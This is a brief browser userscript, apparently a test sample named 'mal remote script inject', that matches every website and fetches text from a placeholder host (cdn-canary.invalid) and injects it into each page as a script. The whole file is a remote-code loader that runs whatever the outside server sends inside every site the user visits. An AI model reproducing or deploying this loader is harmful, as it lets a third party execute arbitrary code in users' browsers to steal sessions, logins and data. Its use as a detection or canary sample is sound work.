// ==UserScript==
// @name         mal remote script inject
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        none
// ==/UserScript==
fetch("https://cdn-canary.invalid/loader.txt").then(r => r.text()).then(code => {
  const s = document.createElement("script");
  s.textContent = code;
  document.head.appendChild(s);
});
